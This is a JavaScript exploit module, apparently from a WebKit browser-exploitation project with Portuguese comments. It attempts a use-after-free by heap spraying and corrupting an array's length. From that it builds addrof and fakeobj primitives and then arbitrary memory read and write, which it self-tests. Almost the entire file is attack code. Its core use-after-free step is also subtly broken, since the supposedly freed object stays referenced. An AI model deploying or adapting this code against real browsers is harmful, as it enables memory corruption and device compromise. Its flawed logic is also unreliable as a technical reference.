// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R66 - Correção de Sintaxe)
// =======================================================================================
// O R65 falhou devido a um erro de sintaxe (funções duplicadas).
// ESTA VERSÃO CORRIGE O ERRO DE 'Identifier has already been declared'.
// - As funções auxiliares foram movidas para o topo do arquivo e definidas apenas uma vez.
// - A lógica de exploração da R65 foi mantida intacta, pois ainda não foi testada.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R66_Syntax_Fix";

// --- Definições de Funções Auxiliares (Definidas uma única vez) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}

async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

async function triggerAndLinkUncagedArrayUAF() {
    let leaker_obj = null;
    let confused_arr = null;

    function createDanglingPointer() {
        function createScope() {
            const victim_obj = { p0: null, p1:null, p2:null, p3:null };
            leaker_obj = victim_obj; 
        }
        createScope();
    }

    createDanglingPointer();
    await triggerGC_Tamed();

    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        spray_arrays.push([1.1]);
    }
    
    logS3("    Procurando por array reutilizado via corrupção de 'length'...", "info");
    leaker_obj.p0 = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF));

    for (const arr of spray_arrays) {
        if (arr.length > 1) {
            confused_arr = arr;
            logS3(`    Array vinculado encontrado! Novo length: ${arr.length}`, "good");
            break;
        }
    }
    
    if (!confused_arr) {
        throw new Error("Falha ao encontrar o array reutilizado na memória (verificação de length).");
    }

    // Restaura o 'length' e limpa a propriedade para uso futuro.
    confused_arr[0] = int64ToDouble(new AdvancedInt64(0x100000001, 0)); 
    leaker_obj.p0 = null;

    return { leaker_obj, confused_arr };
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R66)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Correção de Sintaxe (R66) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };

    try {
        // --- FASE 1: Obter e Vincular Referência Confusa ---
        logS3("--- FASE 1: Provocando UAF e Vinculando Referências ---", "subtest");
        const { leaker_obj, confused_arr } = await triggerAndLinkUncagedArrayUAF();
        if (!leaker_obj || !confused_arr) throw new Error("A rotina do UAF falhou em retornar os objetos de controle.");
        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável e vinculado! ++++++++++++", "vuln");

        // --- FASE 2: Forjar e Verificar Primitivas addrof/fakeobj ---
        logS3("--- FASE 2: Forjando e Verificando Primitivas Base ---", "subtest");
        function addrof(obj) { leaker_obj.p0 = obj; return doubleToInt64(confused_arr[0]); }
        function fakeobj(addr) { confused_arr[0] = int64ToDouble(addr); return leaker_obj.p0; }
        const test_obj = { marker: 0x41414141 };
        const test_addr = addrof(test_obj);
        if (fakeobj(test_addr) !== test_obj) throw new Error("Auto-teste de addrof/fakeobj falhou.");
        logS3("    Primitivas 'addrof' e 'fakeobj' validadas com sucesso.", "good");

        // --- FASE 3: Forjar Primitivas de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 3: Forjando Leitura/Escrita Arbitrária ---", "subtest");
        function arb_read(addr) { let fake = fakeobj(addr); return addrof(fake.p0); }
        function arb_write(addr, val) { let fake = fakeobj(addr); fake.p0 = val; }
        logS3("    Primitivas 'arb_read' e 'arb_write' definidas.", "info");

        // --- FASE 4: Teste Final de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 4: Testando Leitura/Escrita em Memória ---", "subtest");
        const test_array = [{}];
        const test_array_addr = addrof(test_array);
        logS3(`    Endereço do array de teste: ${test_array_addr.toString(true)}`, "leak");

        const original_ptr = arb_read(test_array_addr.add(0x10));
        logS3(`    Ponteiro original em [addr+0x10]: ${original_ptr.toString(true)}`, "leak");

        const marker_obj = { marker: 0xCAFEBABE };
        arb_write(test_array_addr.add(0x10), marker_obj);
        
        const new_ptr = arb_read(test_array_addr.add(0x10));
        logS3(`    Ponteiro modificado em [addr+0x10]: ${new_ptr.toString(true)}`, "leak");
        
        if (new_ptr.equals(original_ptr) || !addrof(marker_obj).equals(new_ptr)) {
            throw new Error("A verificação de escrita/leitura arbitrária falhou.");
        }

        logS3("++++++++++++ SUCESSO TOTAL! Exploit completo com R/W arbitrário! ++++++++++++", "vuln");
        final_result = { success: true, message: "Cadeia de exploração completa. Leitura/Escrita arbitrária obtida." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
}
